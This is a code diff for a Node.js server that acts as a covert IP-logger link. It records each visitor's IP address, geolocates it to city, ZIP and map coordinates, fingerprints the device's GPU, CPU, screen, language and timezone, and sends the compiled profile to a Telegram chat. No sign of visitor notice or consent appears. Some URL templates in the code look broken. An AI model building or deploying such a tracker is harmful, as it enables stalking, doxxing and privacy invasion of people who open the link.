@@ -19,16 +19,19 @@ function sendTelegramMessage(text) {
     req.write(data); req.end();
 }
 
+// Queries clean public geolocation maps with an explicit fallback error catcher
 function queryNetworkDetails(ip, callback) {
     if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
         return callback({
-            status: "success", city: "Local Test Profile", regionName: "Home Network",
-            country: "Local Host", isp: "Internal Router Connection", mobile: false, proxy: false
+            status: "success", city: "Local Dev Machine", regionName: "Local System",
+            country: "Local Host Environment", isp: "Internal Loopback Route", mobile: false, proxy: false
         });
     }
 
-    // Using an alternative endpoint fields string to guarantee data mapping success
-    https.get(`https://ip-api.com{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,mobile,proxy`, (res) => {
+    // Requests full detailed tracking layout fields from the network infrastructure database
+    const endpoint = `https://ip-api.com{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,mobile,proxy`;
+    
+    https.get(endpoint, (res) => {
         let data = '';
         res.on('data', chunk => data += chunk);
         res.on('end', () => {
@@ -42,51 +45,47 @@ function queryNetworkDetails(ip, callback) {
 const server = http.createServer((req, res) => {
     const userAgent = req.headers['user-agent'] || '';
     
-    // FIX 1: Ignore automated bot visits and browser icon background queries completely
+    // Drop junk robot pings and background web browser icons right away
     if (userAgent.toLowerCase().includes('uptimerobot') || req.url === '/favicon.ico') {
-        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); 
-        res.end(); 
-        return;
+        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); res.end(); return;
     }
 
-    // Extract the true public IP passing through Render's network boundaries
+    // CRITICAL FIX: Explicitly extract the public IP passing through Render's load balancer
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-    const cleanIp = rawIp.split(',')[0].trim();
+    const cleanIp = rawIp.split(',')[0].trim(); // Pull the true left-most origin parameter address
 
     if (req.method === 'GET' && req.url === '/') {
         const timestamp = new Date().toLocaleString();
         
-        let deviceModel = "Unknown Brand Device";
+        let deviceModel = "Desktop Computer / Laptop";
         if (/iPhone/i.test(userAgent)) deviceModel = "Apple iPhone";
         else if (/iPad/i.test(userAgent)) deviceModel = "Apple iPad";
         else if (/Android/i.test(userAgent)) {
             const match = userAgent.match(/Android\s+[^;]+;\s+([^)]+)/);
-            deviceModel = match ? `Android Device (${match[1]})` : "Android Device";
-        } else if (/Windows NT/i.test(userAgent)) deviceModel = "Windows PC / Laptop";
-        else if (/Macintosh/i.test(userAgent)) deviceModel = "Apple Mac Computer";
+            deviceModel = match ? `Android Device (${match[1]})` : "Android Phone";
+        } else if (/Macintosh/i.test(userAgent)) deviceModel = "Apple Mac Computer";
 
         queryNetworkDetails(cleanIp, (net) => {
-            // Instantly structure cache map object profile
+            // Set up memory profile container layer
             logCache[cleanIp] = {
-                timestamp, deviceModel,
-                ip: cleanIp,
-                isp: net && net.status === 'success' ? net.isp : "Hidden ISP Profile",
-                city: net && net.status === 'success' ? net.city : "Unknown City",
+                timestamp, deviceModel, ip: cleanIp,
+                isp: net && net.status === 'success' ? net.isp : "Unknown / Private Carrier Network",
+                city: net && net.status === 'success' ? net.city : "Unknown City Location",
                 region: net && net.status === 'success' ? net.regionName : "Unknown Region",
                 country: net && net.status === 'success' ? net.country : "Unknown Country",
                 zip: net && net.status === 'success' ? net.zip : "N/A",
-                isMobile: net && net.mobile ? "Yes (Cellular Data Network)" : "No (Wi-Fi / Broadband)",
-                isProxy: net && net.proxy ? "⚠️ Yes (VPN / Proxy Network Active)" : "No (Direct Clear Connection)",
+                networkType: net && net.mobile ? "📶 Mobile Cellular Data (3G/4G/5G)" : "🌐 Fixed Broadband / Wi-Fi Network",
+                proxyAlert: net && net.proxy ? "⚠️ VPN or Privacy Proxy Active" : "🔒 Direct Clean Line Connection",
                 map: net && net.lat ? `https://google.com{net.lat},${net.lon}` : null,
                 sent: false
             };
 
-            // Safety timeout fallback: Dispatch data even if browser specs processing fails
+            // Safety timeout: Send whatever data we have if browser specs fail to sync up
             setTimeout(() => {
                 if (logCache[cleanIp] && !logCache[cleanIp].sent) {
                     compileAndSendReport(cleanIp, null);
                 }
-            }, 1500);
+            }, 1200);
         });
 
         fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
@@ -108,33 +107,34 @@ const server = http.createServer((req, res) => {
 function compileAndSendReport(ip, specs) {
     const info = logCache[ip];
     if (!info || info.sent) return;
-    info.sent = true; // FIX 2: Lock message deployment immediately so it can never duplicate
+    info.sent = true; // LOCK OUT REPETITIVE ALERTS IMMEDIATELY
 
-    const screenString = specs ? `${specs.width}x${specs.height} (@${specs.pixelRatio}x)` : "Not Reported";
-    const gpuString = specs ? specs.gpu : "Not Reported";
-    const cpuString = specs ? `${specs.cores} Core Processors` : "Not Reported";
-    const langString = specs ? specs.language : "Not Reported";
-    const zoneString = specs ? specs.timezone : "Not Reported";
+    const screenString = specs ? `${specs.width}x${specs.height} (@${specs.ratio}x)` : "Hardware Restricted";
+    const gpuString = specs ? specs.gpu : "Hardware Restricted";
+    const cpuString = specs ? `${specs.cores} Core Engine` : "Hardware Restricted";
+    const langString = specs ? specs.lang : "Hardware Restricted";
+    const zoneString = specs ? specs.zone : "Hardware Restricted";
 
-    let locationMapBlock = info.map ? `\n🗺️ [Open Google Maps Gateway Connection](${info.map})` : "";
+    let locationMapBlock = info.map ? `\n🗺️ [Open Google Maps Estimated ISP Hub Area](${info.map})` : "";
 
-    const fullReport = `📁 *Consolidated Link Access Profile*\n\n` +
-                       `📶 *Public Network IP:* \`${info.ip}\`\n` +
-                       `🏢 *Internet Service Operator (ISP):* ${info.isp}\n` +
-                       `📶 *Connection Framework:* ${info.isMobile}\n` +
-                       `🛡️ *Anonymity Shield Profile:* ${info.isProxy}\n` +
+    // Assemble the clean, comprehensive single message card
+    const finalReport = `📁 *Link Connection Profile Created*\n\n` +
+                       `📶 *Public External IP:* \`${info.ip}\`\n` +
+                       `🏢 *Network Operator (ISP):* ${info.isp}\n` +
+                       `📡 *Connection Framework:* ${info.networkType}\n` +
+                       `🛡️ *Network Shield Verification:* ${info.proxyAlert}\n` +
                        `🌍 *Estimated Location:* ${info.city}, ${info.region}, ${info.country} (${info.zip})\n\n` +
-                       `📱 *Detected Hardware Profile:* ${info.deviceModel}\n` +
-                       `⚙️ *CPU Processing Capacity:* ${cpuString}\n` +
-                       `🎮 *Graphics Processor (GPU):* \`${gpuString}\`\n` +
-                       `🖥️ *Display Resolutions:* ${screenString}\n` +
-                       `🌐 *System Language Configuration:* ${langString}\n` +
+                       `📱 *Hardware Base Type:* ${info.deviceModel}\n` +
+                       `⚙️ *Internal CPU Cores:* ${cpuString}\n` +
+                       `🎮 *Graphics Framework (GPU):* \`${gpuString}\`\n` +
+                       `🖥️ *Screen Aspect Layout:* ${screenString}\n` +
+                       `🗣️ *System Local Language:* ${langString}\n` +
                        `⏰ *Device Time Zone Profile:* ${zoneString}\n\n` +
-                       `⏱️ *Time Stamp Notification:* ${info.timestamp}` +
+                       `⏱️ *Time Stamp Registered:* ${info.timestamp}` +
                        locationMapBlock;
 
-    sendTelegramMessage(fullReport);
-    delete logCache[ip]; // Clean memory storage allocation out completely
+    sendTelegramMessage(finalReport);
+    delete logCache[ip];
 }
 
 const PORT = process.env.PORT || 3000;
